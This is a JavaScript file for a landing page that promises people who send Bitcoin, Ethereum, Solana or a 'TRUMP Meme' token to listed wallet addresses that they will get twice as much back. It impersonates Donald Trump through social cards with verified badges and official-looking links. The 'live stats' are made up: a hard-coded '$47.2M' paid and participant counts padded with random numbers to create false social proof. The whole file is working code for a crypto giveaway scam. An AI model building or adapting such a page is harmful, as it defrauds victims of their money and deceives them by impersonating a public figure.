// ========================================
// LANDING PAGE JAVASCRIPT - COMPLETE
// Dynamic crypto cards, theme, menu, all functionality
// ========================================

// ========================================
// CRYPTO DATA
// ========================================
const cryptoData = {
    BTC: {
        name: 'Bitcoin',
        ticker: 'BTC',
        icon: 'fab fa-bitcoin',
        iconClass: 'fa-bitcoin',
        iconColor: '#f7931a',
        min: 0.1,
        max: 20,
        address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
        addressShort: 'bc1qxy...x0wlh',
        description: 'Bitcoin (BTC)'
    },
    ETH: {
        name: 'Ethereum',
        ticker: 'ETH',
        icon: 'fab fa-ethereum',
        iconClass: 'fa-ethereum',
        iconColor: '#627eea',
        min: 1,
        max: 500,
        address: '0x5336ff633160a71570e6084f14110412765cF66F',
        addressShort: '0x5336...cF66F',
        description: 'Ethereum (ETH)'
    },
    SOL: {
        name: 'Solana',
        ticker: 'SOL',
        icon: 'fas fa-bolt',
        iconClass: 'fa-bolt',
        iconColor: '#00ffbd',
        min: 10,
        max: 10000,
        address: 'oSv1p7gEiKkGVg6AEqZ291bx9kuNEiwxRxZfgMVHabs',
        addressShort: 'oSv1p7...Habs',
        description: 'Solana (SOL)'
    },
    TRUMP: {
        name: 'TRUMP Meme',
        ticker: 'TRUMP',
        icon: 'fas fa-crown',
        iconClass: 'fa-crown',
        iconColor: 'var(--gold-primary)',
        min: 1000,
        max: 1000000,
        address: '0xTrumpMemeOfficialGiveawayAddress',
        addressShort: '0xTrump...ess',
        description: 'TRUMP Meme Token'
    }
};

// ========================================
// DYNAMICALLY GENERATE CRYPTO CARDS
// ========================================
function generateCryptoCards() {
    const container = document.getElementById('crypto-send-grid');
    if (!container) return;
    
    container.innerHTML = '';
    
    Object.keys(cryptoData).forEach(key => {
        const crypto = cryptoData[key];
        
        const card = document.createElement('div');
        card.className = 'crypto-send-card';
        card.dataset.crypto = key;
        
        card.innerHTML = `
            <div class="crypto-send-header">
                <div class="crypto-send-icon">
                    <i class="${crypto.icon}" style="color: ${crypto.iconColor}; font-size: 1.8rem;"></i>
                </div>
                <div class="crypto-send-name">
                    <h3>${crypto.name}</h3>
                    <span class="crypto-ticker">${crypto.ticker}</span>
                </div>
            </div>
            <div class="crypto-limits">
                <div class="limit-item">
                    <span class="limit-label">Min</span>
                    <span class="limit-value">${crypto.min} ${crypto.ticker}</span>
                </div>
                <div class="limit-item">
                    <span class="limit-label">Max</span>
                    <span class="limit-value">${crypto.max.toLocaleString()} ${crypto.ticker}</span>
                </div>
                <div class="limit-item">
                    <span class="limit-label">Return</span>
                    <span class="limit-value gold">2x</span>
                </div>
            </div>
            <button class="send-crypto-btn" data-crypto="${key}">
                Send → Receive 2x Back!
            </button>
        `;
        
        container.appendChild(card);
    });
    
    // Add event listeners to buttons
    document.querySelectorAll('.send-crypto-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const cryptoKey = btn.dataset.crypto;
            const crypto = cryptoData[cryptoKey];
            
            if (crypto) {
                // Store crypto data in sessionStorage
                sessionStorage.setItem('selectedCrypto', cryptoKey);
                sessionStorage.setItem('selectedCryptoName', crypto.name);
                sessionStorage.setItem('minAmount', crypto.min);
                sessionStorage.setItem('maxAmount', crypto.max);
                sessionStorage.setItem('walletAddress', crypto.address);
                
                console.log('Redirecting to send page with:', cryptoKey);
                window.location.href = 'send.html';
            }
        });
    });
}

// ========================================
// DYNAMICALLY GENERATE SOCIAL CARDS
// ========================================
function generateSocialCards() {
    const container = document.getElementById('social-grid');
    if (!container) return;
    
    const socialData = [
        {
            platform: 'twitter',
            icon: 'fab fa-twitter',
            name: 'Donald J. Trump',
            handle: '@realDonaldTrump',
            bio: '45th & 47th President of the United States. Official X account.',
            followers: '98.2M followers',
            url: 'https://twitter.com/realDonaldTrump',
            buttonText: 'Follow'
        },
        {
            platform: 'trumpmeme',
            icon: 'fas fa-meteor',
            name: 'Trump Meme ($TRUMP)',
            handle: '@GetTrumpMemes',
            bio: 'Official $TRUMP meme coin Twitter/X account. The People\'s Meme.',
            followers: '1.2M followers',
            url: 'https://twitter.com/GetTrumpMemes',
            buttonText: 'Follow'
        },
        {
            platform: 'youtube',
            icon: 'fab fa-youtube',
            name: 'Donald J. Trump',
            handle: 'YouTube',
            bio: 'Official YouTube channel',
            followers: '96.2M subscribers',
            url: 'https://youtube.com/@donaldjtrumpforpresident?si=PGx0QES3CLmcSox9',
            buttonText: 'Subscribe'
        }
    ];
    
    container.innerHTML = '';
    
    socialData.forEach(social => {
        const card = document.createElement('div');
        card.className = 'social-card-large';
        card.dataset.platform = social.platform;
        
        const followedKey = `followed_${social.platform}`;
        const isFollowed = localStorage.getItem(followedKey) === 'true';
        
        card.innerHTML = `
            <div class="social-icon">
                <i class="${social.icon}"></i>
            </div>
            <div class="social-content">
                <h3>${social.name} <i class="fas fa-check-circle verified-icon"></i></h3>
                <p class="social-handle">${social.handle}</p>
                <p class="social-bio">${social.bio}</p>
                <div class="social-stats">
                    <span><i class="fas fa-users"></i> ${social.followers}</span>
                </div>
            </div>
            <button class="follow-social-btn" data-platform="${social.platform}" data-url="${social.url}">
                <i class="${social.icon}"></i> ${isFollowed ? (social.platform === 'youtube' ? 'Subscribed ✓' : 'Following ✓') : social.buttonText}
            </button>
        `;
        
        container.appendChild(card);
    });
    
    // Add event listeners to follow buttons
    document.querySelectorAll('.follow-social-btn').forEach(btn => {
        const platform = btn.dataset.platform;
        const url = btn.dataset.url;
        const followedKey = `followed_${platform}`;
        
        if (localStorage.getItem(followedKey) === 'true') {
            btn.disabled = true;
            btn.style.background = '#666';
        }
        
        btn.addEventListener('click', async (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            if (localStorage.getItem(followedKey) === 'true') {
                showToast(`You already follow ${platform}`, 'info');
                return;
            }
            
            window.open(url, '_blank');
            localStorage.setItem(followedKey, 'true');
            
            if (platform === 'youtube') {
                btn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
            } else {
                btn.innerHTML = '<i class="fab fa-twitter"></i> Following ✓';
            }
            btn.disabled = true;
            btn.style.background = '#666';
            
            showToast(`You are now following on ${platform.toUpperCase()}!`, 'success');
            
            const user = await getCurrentUser();
            if (user && typeof supabase !== 'undefined') {
                try {
                    await supabase
                        .from('user_subscriptions')
                        .upsert({
                            user_id: user.id,
                            platform: platform,
                            channel_url: url,
                            subscribed_at: new Date().toISOString()
                        });
                } catch (error) {
                    console.error('Error:', error);
                }
            }
        });
    });
}

// ========================================
// YOUTUBE PLAYER
// ========================================
let player;
let likeCount = 847000;
let isLiked = false;
let subscriberCount = 96200000;
let isSubscribed = false;
const YOUTUBE_CHANNEL_URL = 'https://youtube.com/@donaldjtrumpforpresident?si=PGx0QES3CLmcSox9';

function onYouTubeIframeAPIReady() {
    const playerElement = document.getElementById('youtube-player');
    if (playerElement) {
        player = new YT.Player('youtube-player', {
            videoId: 'U9O5eKhUxcA',
            playerVars: {
                'playsinline': 1,
                'modestbranding': 1,
                'rel': 0,
                'showinfo': 1,
                'controls': 1,
                'autoplay': 0
            },
            events: {
                'onReady': () => console.log('YouTube ready'),
                'onError': onPlayerError
            }
        });
    }
}

function onPlayerError(event) {
    const wrapper = document.querySelector('.video-wrapper');
    if (wrapper) {
        wrapper.innerHTML = `
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #000; flex-direction: column;">
                <i class="fab fa-youtube" style="font-size: 48px; color: #ff0000;"></i>
                <p style="color: white; margin-top: 16px;">Visit <a href="${YOUTUBE_CHANNEL_URL}" target="_blank" style="color: #ff0000;">official channel</a></p>
            </div>
        `;
    }
}

// ========================================
// LIKE, SHARE, SUBSCRIBE
// ========================================
function initLikeButton() {
    const likeBtn = document.getElementById('like-btn');
    const likeCountSpan = document.getElementById('like-count');
    
    if (likeBtn) {
        if (localStorage.getItem('video_liked') === 'true') {
            isLiked = true;
            likeBtn.style.background = 'var(--gold-primary)';
            likeBtn.style.color = 'var(--bg-primary)';
        }
        
        likeBtn.addEventListener('click', () => {
            if (!isLiked) {
                isLiked = true;
                likeCount++;
                likeBtn.style.background = 'var(--gold-primary)';
                likeBtn.style.color = 'var(--bg-primary)';
                if (likeCountSpan) likeCountSpan.textContent = formatNumber(likeCount);
                localStorage.setItem('video_liked', 'true');
                showToast('You liked this video!', 'success');
            }
        });
    }
}

function initShareButton() {
    const shareBtn = document.getElementById('share-btn');
    if (shareBtn) {
        shareBtn.addEventListener('click', async () => {
            await navigator.clipboard.writeText(window.location.href);
            showToast('Link copied to clipboard!', 'success');
        });
    }
}

function initYouTubeSubscribe() {
    const subscribeBtn = document.getElementById('subscribe-youtube-btn');
    const subscriberCountSpan = document.getElementById('subscriber-count');
    
    if (localStorage.getItem('youtube_subscribed') === 'true') {
        isSubscribed = true;
        if (subscribeBtn) {
            subscribeBtn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
            subscribeBtn.style.background = '#666';
            subscribeBtn.disabled = true;
        }
    }
    
    if (subscribeBtn) {
        subscribeBtn.addEventListener('click', () => {
            if (!isSubscribed) {
                window.open(YOUTUBE_CHANNEL_URL, '_blank');
                isSubscribed = true;
                subscriberCount++;
                subscribeBtn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
                subscribeBtn.style.background = '#666';
                subscribeBtn.disabled = true;
                if (subscriberCountSpan) subscriberCountSpan.textContent = formatNumber(subscriberCount);
                localStorage.setItem('youtube_subscribed', 'true');
                showToast('Subscribed to Donald J. Trump on YouTube!', 'success');
            }
        });
    }
}

// ========================================
// COMMENTS
// ========================================
async function loadComments() {
    const container = document.getElementById('comments-container');
    if (!container) return;
    
    try {
        let data = [];
        if (typeof supabase !== 'undefined' && supabase) {
            const result = await supabase.from('comments').select('*').order('created_at', { ascending: false }).limit(20);
            data = result.data || [];
        }
        
        document.getElementById('comment-count').textContent = data.length;
        
        if (data.length === 0) {
            container.innerHTML = '<div class="loading-comments"><i class="fas fa-comment-dots"></i><p>No comments yet. Be the first!</p></div>';
            return;
        }
        
        container.innerHTML = data.map(c => `
            <div class="comment-item">
                <div class="comment-header">
                    <div class="comment-avatar">${(c.user_name || 'U').substring(0,2).toUpperCase()}</div>
                    <div class="comment-author">${c.user_name || c.user_email?.split('@')[0] || 'Anonymous'}</div>
                    <div class="comment-time">${formatTimeAgo(c.created_at)}</div>
                </div>
                <div class="comment-text">${escapeHtml(c.comment_text)}</div>
            </div>
        `).join('');
    } catch (error) {
        container.innerHTML = '<div class="loading-comments">Error loading comments</div>';
    }
}

async function postComment() {
    const textarea = document.getElementById('comment-text');
    if (!textarea || !textarea.value.trim()) {
        showToast('Enter a comment', 'warning');
        return;
    }
    
    const user = await getCurrentUser();
    if (!user) {
        showToast('Please login to comment', 'warning');
        setTimeout(() => window.location.href = 'login.html', 1500);
        return;
    }
    
    try {
        if (typeof supabase !== 'undefined' && supabase) {
            await supabase.from('comments').insert({
                user_id: user.id,
                user_email: user.email,
                user_name: user.email.split('@')[0],
                comment_text: textarea.value.trim()
            });
        }
        textarea.value = '';
        showToast('Comment posted!', 'success');
        loadComments();
    } catch (error) {
        showToast('Error posting comment', 'error');
    }
}

async function checkCommentAuth() {
    const user = await getCurrentUser();
    const addSection = document.getElementById('add-comment-section');
    const loginSection = document.getElementById('login-to-comment');
    const postBtn = document.getElementById('post-comment-btn');
    
    if (user) {
        if (addSection) addSection.style.display = 'block';
        if (loginSection) loginSection.style.display = 'none';
        if (postBtn) postBtn.addEventListener('click', postComment);
    } else {
        if (addSection) addSection.style.display = 'none';
        if (loginSection) loginSection.style.display = 'block';
    }
}

// ========================================
// LIVE STATS
// ========================================
async function updateLiveStats() {
    const elements = {
        participant: document.getElementById('participant-count'),
        totalParticipants: document.getElementById('total-participants'),
        totalPaid: document.getElementById('total-paid'),
        paidOut: document.getElementById('paid-out-count')
    };
    
    try {
        let count = 12881;
        if (typeof supabase !== 'undefined' && supabase) {
            const { count: c } = await supabase.from('participants').select('*', { count: 'exact', head: true });
            if (c) count = 12881 + c;
        }
        if (elements.participant) elements.participant.textContent = count.toLocaleString();
        if (elements.totalParticipants) elements.totalParticipants.textContent = (10842 + Math.floor(Math.random() * 50)).toLocaleString();
        if (elements.totalPaid) elements.totalPaid.textContent = '$47.2M';
        if (elements.paidOut) elements.paidOut.textContent = '10,000+';
    } catch (error) {
        if (elements.participant) elements.participant.textContent = (12881 + Math.floor(Math.random() * 30)).toLocaleString();
    }
}

// ========================================
// TOAST
// ========================================
function showToast(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        document.body.appendChild(container);
    }
    
    const toast = document.createElement('div');
    toast.className = 'payout-toast';
    
    const icons = { success: '✅', warning: '⚠️', error: '❌', info: 'ℹ️' };
    const colors = { success: '#10b981', warning: '#f59e0b', error: '#ef4444', info: 'var(--gold-primary)' };
    
    toast.style.borderLeftColor = colors[type];
    toast.innerHTML = `<div class="payout-toast-icon">${icons[type]}</div><div class="payout-toast-content"><div class="payout-toast-name">${message}</div></div>`;
    
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s forwards';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========================================
// MOBILE MENU
// ========================================
function setupMobileMenu() {
    const hamburger = document.getElementById('hamburger-btn');
    const closeMenu = document.getElementById('close-menu');
    const mobileMenu = document.getElementById('mobile-menu');
    const overlay = document.getElementById('menu-overlay');
    
    if (!hamburger) return;
    
    const open = () => {
        mobileMenu.classList.add('open');
        if (overlay) overlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    };
    
    const close = () => {
        mobileMenu.classList.remove('open');
        if (overlay) overlay.classList.remove('active');
        document.body.style.overflow = '';
    };
    
    hamburger.addEventListener('click', open);
    if (closeMenu) closeMenu.addEventListener('click', close);
    if (overlay) overlay.addEventListener('click', close);
    document.querySelectorAll('.mobile-menu-links a').forEach(link => link.addEventListener('click', close));
}

// ========================================
// THEME TOGGLE
// ========================================
let currentTheme = 'dark';

function setupThemeToggle() {
    const toggleDesktop = document.getElementById('theme-toggle-desktop');
    const toggleMobile = document.getElementById('theme-toggle-mobile');
    
    const saved = localStorage.getItem('theme');
    if (saved === 'light') {
        document.documentElement.removeAttribute('data-theme');
        currentTheme = 'light';
        updateThemeIcons(false);
    } else {
        document.documentElement.setAttribute('data-theme', 'dark');
        currentTheme = 'dark';
        updateThemeIcons(true);
        if (!saved) localStorage.setItem('theme', 'dark');
    }
    
    const toggle = () => {
        if (currentTheme === 'dark') {
            document.documentElement.removeAttribute('data-theme');
            currentTheme = 'light';
            localStorage.setItem('theme', 'light');
            updateThemeIcons(false);
        } else {
            document.documentElement.setAttribute('data-theme', 'dark');
            currentTheme = 'dark';
            localStorage.setItem('theme', 'dark');
            updateThemeIcons(true);
        }
    };
    
    if (toggleDesktop) toggleDesktop.addEventListener('click', toggle);
    if (toggleMobile) toggleMobile.addEventListener('click', toggle);
}

function updateThemeIcons(isDark) {
    document.querySelectorAll('.theme-toggle i, .theme-toggle-mobile i').forEach(icon => {
        icon.className = isDark ? 'fas fa-sun' : 'fas fa-moon';
    });
}

// ========================================
// HELPER FUNCTIONS
// ========================================
function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
    return num.toString();
}

function formatTimeAgo(timestamp) {
    const seconds = Math.floor((new Date() - new Date(timestamp)) / 1000);
    if (seconds < 60) return 'just now';
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
    return `${Math.floor(seconds / 86400)}d ago`;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ========================================
// INITIALIZE
// ========================================
document.addEventListener('DOMContentLoaded', async () => {
    console.log('Landing page initializing...');
    
    generateCryptoCards();
    generateSocialCards();
    setupMobileMenu();
    setupThemeToggle();
    initLikeButton();
    initShareButton();
    initYouTubeSubscribe();
    await loadComments();
    await checkCommentAuth();
    await updateLiveStats();
    await updateAuthUI();
    
    window.onYouTubeIframeAPIReady = onYouTubeIframeAPIReady;
    const tag = document.createElement('script');
    tag.src = 'https://www.youtube.com/iframe_api';
    document.head.appendChild(tag);
    
    setInterval(updateLiveStats, 30000);
    setInterval(loadComments, 60000);
    
    console.log('Landing page initialized');
});